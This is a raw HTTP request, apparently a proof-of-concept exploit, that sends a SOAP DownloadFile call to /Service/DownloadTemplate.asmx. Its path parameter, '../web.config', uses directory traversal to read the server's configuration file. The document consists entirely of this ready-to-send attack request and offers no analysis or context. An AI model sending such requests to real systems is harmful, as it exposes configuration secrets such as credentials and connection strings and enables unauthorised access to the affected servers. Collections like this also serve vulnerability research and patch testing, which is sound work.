```
POST /Service/DownloadTemplate.asmx HTTP/1.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:127.0) Gecko/20100101 Firefox/127.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate, br
Connection: close
Cookie: ASP.NET_SessionId=f40br0ilcoosnxgllqrmltkd
Upgrade-Insecure-Requests: 1
Priority: u=1
SOAPAction: http://tempuri.org/DownloadFile
Content-Type: text/xml;charset=UTF-8
Host: 
Content-Length: 310

<soapenv:Envelope xmlns:soapenv="http://schemas.xmlsoap.org/soap/envelope/" xmlns:tem="http://tempuri.org/">
<soapenv:Header/>
<soapenv:Body>
<tem:DownloadFile>
<!--type: string-->
<tem:path>../web.config</tem:path>
</tem:DownloadFile>
</soapenv:Body>
</soapenv:Envelope>
```

